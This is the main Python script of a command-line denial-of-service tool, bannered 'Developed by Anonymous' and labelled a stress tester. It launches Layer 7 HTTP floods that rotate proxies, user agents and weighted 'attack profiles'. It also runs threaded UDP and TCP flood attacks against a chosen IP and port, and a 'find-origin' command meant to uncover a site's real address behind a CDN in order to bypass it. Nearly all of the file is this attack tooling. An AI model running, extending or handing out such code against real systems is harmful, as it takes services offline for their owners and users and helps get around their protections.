import argparse
import json
import sys
import time
import os
import asyncio
import random
import aiohttp
import ssl
import threading
from urllib.parse import urlparse
from requester import async_send_request, dns_worker, analyze_target, find_origin_server, udp_flood_worker, tcp_flood_worker
from reporter import print_report, print_dns_check_report, print_analysis_report, export_dns_report, print_origin_report, print_flood_report

try:
    from colorama import Fore, Style, init
except ImportError:
    print("Error: 'colorama' library not found. Please install it using: pip install colorama")
    sys.exit(1)

def print_banner():
    init(autoreset=True)
    banner = r"""
   _____         .__    .___            
  /     \ _____  |__| __| _/____  ______
 /  \ /  \\__  \ |  |/ __ |/  _ \/  ___/
/    Y    \/ __ \|  / /_/ (  <_> )___ \ 
\____|__  (____  /__\____ |\____/____  >
        \/     \/        \/          \/ 
    """
    print(Fore.RED + Style.BRIGHT + banner)
    print(Fore.YELLOW + Style.BRIGHT + " " * 20 + "Developed by Anonymous")
    print(Fore.WHITE + "=" * 50)

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        print(f"{Fore.YELLOW}Warning: URL '{url}' has no scheme. Assuming http://")
        return f"http://{url}"
    return url

def load_data_files():
    data = {'payloads': [], 'user_agents': [], 'headers': []}
    base_dir = 'data'

    payloads_dir = os.path.join(base_dir, 'payloads')
    if os.path.isdir(payloads_dir):
        for filename in os.listdir(payloads_dir):
            filepath = os.path.join(payloads_dir, filename)
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    if filename.endswith('.json'):
                        data['payloads'].append({'type': 'json', 'content': json.load(f)})
                    elif filename.endswith('.txt'):
                        data['payloads'].append({'type': 'form', 'content': f.read().strip()})
            except Exception as e:
                print(f"{Fore.RED}Warning: Could not load payload file {filename}: {e}")

    user_agents_file = os.path.join(base_dir, 'user_agents.txt')
    if os.path.isfile(user_agents_file):
        try:
            with open(user_agents_file, 'r', encoding='utf-8') as f:
                data['user_agents'] = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED}Warning: Could not load user_agents.txt: {e}")

    headers_file = os.path.join(base_dir, 'headers.json')
    if os.path.isfile(headers_file):
        try:
            with open(headers_file, 'r', encoding='utf-8') as f:
                data['headers'] = json.load(f)
        except Exception as e:
            print(f"{Fore.RED}Warning: Could not load headers.json: {e}")

    print(f"\n--- {Fore.CYAN}Loaded Default Data Files{Style.RESET_ALL} ---")
    print(f"Payloads: {Fore.YELLOW}{len(data['payloads'])}{Style.RESET_ALL} found")
    print(f"User-Agents: {Fore.YELLOW}{len(data['user_agents'])}{Style.RESET_ALL} found")
    print(f"Header Sets: {Fore.YELLOW}{len(data['headers'])}{Style.RESET_ALL} found")
    print("---------------------------------\n")
    return data

async def run_stress_test(args):
    base_url = None
    if args.url:
        base_url = normalize_url(args.url)
    elif args.ip_port:
        try:
            ip, port = args.ip_port.split(':')
            scheme = 'https' if port == '443' else 'http'
            base_url = f"{scheme}://{ip}:{port}"
            print(f"Targeting IP:Port directly: {base_url}")
        except ValueError:
            print(f"{Fore.RED}Error: Invalid format for -Ip. Please use 'IP:PORT' (e.g., 127.0.0.1:8080).")
            sys.exit(1)

    default_data = load_data_files()

    attack_profile = None
    if args.attack_profile:
        profile_path = 'data/attack_profile.json'
        try:
            with open(profile_path, 'r', encoding='utf-8') as f:
                attack_profile = json.load(f)
            print(f"{Fore.GREEN}Successfully loaded attack profile from: {profile_path}")
        except Exception as e:
            print(f"{Fore.RED}Error: Could not load attack profile '{profile_path}': {e}")
            sys.exit(1)
    else:
        attack_profile = [{"path": "/", "method": "GET", "weight": 100, "description": "Simple GET request"}]

    proxies = []
    if args.proxy_file:
        try:
            with open(args.proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: Proxy file not found at '{args.proxy_file}'")
            sys.exit(1)

    print(f"\n=== {Fore.CYAN}Running High-Performance Stress Test (Layer 7){Style.RESET_ALL} ===")
    print(f"Base URL: {Fore.YELLOW}{base_url}{Style.RESET_ALL}\nConcurrent Tasks: {Fore.YELLOW}{args.threads}{Style.RESET_ALL}\nRequests per Task: {Fore.YELLOW}{args.requests}{Style.RESET_ALL}")
    if args.attack_profile:
        print(f"Attack Profile: {Fore.GREEN}Enabled ({len(attack_profile)} rules){Style.RESET_ALL}")
    else:
        print(f"Attack Profile: {Fore.YELLOW}Disabled (Simple Flood Mode){Style.RESET_ALL}")
    if proxies:
        print(f"Proxy Mode: {Fore.GREEN}Enabled ({len(proxies)} proxies){Style.RESET_ALL}")
    if args.insecure:
        print(f"SSL Verification: {Fore.YELLOW}Disabled{Style.RESET_ALL}")
    if args.debug:
        print(f"Debug Mode: {Fore.GREEN}Enabled{Style.RESET_ALL}")
    print("----------------------------------------------------------\n")

    start_time = time.time()

    semaphore = asyncio.Semaphore(500)
    ssl_context = None
    if args.insecure:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(ssl=ssl_context, limit=0)

    async with aiohttp.ClientSession(connector=connector) as session:
        total_requests = args.threads * args.requests
        tasks = []

        population = [rule for rule in attack_profile]
        weights = [rule.get('weight', 1) for rule in attack_profile]

        for _ in range(total_requests):
            selected_proxy = random.choice(proxies) if proxies else None
            chosen_rule = random.choices(population, weights, k=1)[0]

            task = asyncio.create_task(
                async_send_request(
                    session, base_url, default_data, selected_proxy,
                    chosen_rule, semaphore, args.debug
                )
            )
            tasks.append(task)

        await asyncio.gather(*tasks)

    end_time = time.time()
    print_report(start_time, end_time)

def run_flood_attack(args):
    print(f"\n=== {Fore.CYAN}Starting Layer 3/4 Flood Attack{Style.RESET_ALL} ===")
    print(f"Target: {Fore.YELLOW}{args.ip}:{args.port}{Style.RESET_ALL}\nMethod: {Fore.YELLOW}{args.method.upper()}{Style.RESET_ALL}\nThreads: {Fore.YELLOW}{args.threads}{Style.RESET_ALL}\nDuration: {Fore.YELLOW}{args.duration}{Style.RESET_ALL} seconds")
    if args.method == 'udp':
        print(f"Packet Size: {Fore.YELLOW}{args.size}{Style.RESET_ALL} bytes")
    print("----------------------------------------\n")

    threads = []
    attack_function = None

    if args.method == 'udp':
        attack_function = udp_flood_worker
        function_args = (args.ip, args.port, args.duration, args.size)
    elif args.method == 'tcp':
        attack_function = tcp_flood_worker
        function_args = (args.ip, args.port, args.duration)
    else:
        print(f"{Fore.RED}Error: Invalid flood method '{args.method}'")
        return

    start_time = time.time()

    for _ in range(args.threads):
        t = threading.Thread(target=attack_function, args=function_args)
        threads.append(t)
        t.start()

    print(f"{Fore.GREEN}Attack started... Press Ctrl+C to stop early.{Style.RESET_ALL}")

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Attack interrupted by user. Stopping threads...{Style.RESET_ALL}")

    end_time = time.time()
    print_flood_report(start_time, end_time)

def run_dns_check(args):
    print("=== Running Advanced DNS Infrastructure Check ===")
    try:
        hostname = urlparse(args.url).hostname or args.url.split('/')[0]
        if not hostname:
            raise ValueError("Invalid URL/Hostname")
    except Exception:
        print(f"Error: Could not extract hostname from '{args.url}'")
        sys.exit(1)

    print(f"Target Hostname: {hostname}\nTotal Lookups: {args.count}\nThreads: {args.threads}")
    print("--------------------------------\n")

    start_time = time.time()
    thread_list = []
    lookups_per_thread = max(1, args.count // args.threads)

    for _ in range(args.threads):
        t = threading.Thread(target=dns_worker, args=(hostname, lookups_per_thread))
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()
    end_time = time.time()

    print(f"Completed in {end_time - start_time:.2f} seconds.")
    print_dns_check_report()

    if args.output:
        export_dns_report(args.output)

def run_find_origin(args):
    try:
        hostname = urlparse(normalize_url(args.url)).hostname
        if not hostname:
            raise ValueError("Invalid URL/Hostname")
    except Exception:
        print(f"Error: Invalid URL or Hostname '{args.url}'")
        sys.exit(1)

    print(f"Searching for the origin server of {hostname}...")
    find_origin_server(hostname, args.method)
    print_origin_report(hostname)

def run_analysis(args):
    try:
        hostname = urlparse(args.url).hostname
        if not hostname:
            hostname = urlparse(f"https://{args.url}").hostname or args.url
    except Exception:
        print(f"Error: Invalid URL or Hostname '{args.url}'")
        sys.exit(1)

    print(f"Starting intelligent analysis for {hostname}...")
    findings = analyze_target(hostname)
    print_analysis_report(hostname, findings)

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Advanced L7/L4 Stress Testing & Network Analysis Tool",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""{Fore.CYAN}Example usage:{Style.RESET_ALL}
  (L7) python main.py stress -u http://example.com -t 500 -r 1000 --attack-profile
  (L4) python main.py flood -ip 1.2.3.4 -p 80 -t 50 -d 60 --method tcp
  (L4) python main.py flood -ip 1.2.3.4 -p 53 -t 50 -d 60 --method udp --size 1024

Use 'python main.py <command> -h' for more information on a specific command."""
    )

    subparsers = parser.add_subparsers(dest='command', required=True, title='Available Commands')

    parser_stress = subparsers.add_parser('stress', help='Run a Layer 7 (HTTP) stress test.')
    group_stress = parser_stress.add_mutually_exclusive_group(required=True)
    group_stress.add_argument('-u', '--url', help='Target URL (e.g, http://example.com)')
    group_stress.add_argument('-Ip', '--ip_port', help="Target IP and Port (e.g., '127.0.0.1:8080')")
    parser_stress.add_argument('-t', '--threads', type=int, required=True, help='Number of concurrent tasks')
    parser_stress.add_argument('-r', '--requests', type=int, required=True, help='Number of requests per task')
    parser_stress.add_argument('--attack-profile', action='store_true', help='Enable profile-based attack using data/attack_profile.json')
    parser_stress.add_argument('--proxy-file', help='Path to a file containing a list of proxies (one per line).')
    parser_stress.add_argument('--insecure', action='store_true', help='Disable SSL certificate verification.')
    parser_stress.add_argument('--debug', action='store_true', help='Enable debug mode to print live requests.')

    parser_flood = subparsers.add_parser('flood', help='Run a Layer 3/4 flood attack.')
    parser_flood.add_argument('-ip', '--ip', required=True, help='Target IP address.')
    parser_flood.add_argument('-p', '--port', type=int, required=True, help='Target port.')
    parser_flood.add_argument('-d', '--duration', type=int, required=True, help='Duration of the attack in seconds.')
    parser_flood.add_argument('-t', '--threads', type=int, required=True, help='Number of concurrent threads.')
    parser_flood.add_argument('--method', choices=['udp', 'tcp'], required=True, help='Flood method (udp or tcp).')
    parser_flood.add_argument('--size', type=int, default=1024, help='Packet size in bytes for UDP flood (default: 1024).')

    parser_dns = subparsers.add_parser('check-dns', help='Analyze DNS infrastructure and IP distribution.')
    parser_dns.add_argument('-u', '--url', required=True, help='Target URL or Hostname')
    parser_dns.add_argument('-c', '--count', type=int, default=100, help='Total number of DNS lookups.')
    parser_dns.add_argument('-t', '--threads', type=int, default=10, help='Number of threads for lookups.')
    parser_dns.add_argument('-o', '--output', help='Export the report to a file (e.g., report.json).')

    parser_analyze = subparsers.add_parser('analyze', help='Run an intelligent analysis to detect CDNs and server info.')
    parser_analyze.add_argument('-u', '--url', required=True, help='Target URL or Hostname')

    parser_origin = subparsers.add_parser('find-origin', help='Attempt to find the real IP address behind a CDN.')
    parser_origin.add_argument('-u', '--url', required=True, help='Target URL or Hostname')
    parser_origin.add_argument('-m', '--method', help='Specify a CDN to target for bypass (e.g., arvancloud).')

    args = parser.parse_args()
    if args.command == 'stress':
        try:
            asyncio.run(run_stress_test(args))
        except KeyboardInterrupt:
            print("\nTest interrupted by user.")
    elif args.command == 'flood':
        run_flood_attack(args)
    elif args.command == 'check-dns':
        run_dns_check(args)
    elif args.command == 'analyze':
        run_analysis(args)
    elif args.command == 'find-origin':
        run_find_origin(args)

if __name__ == "__main__":
    main()
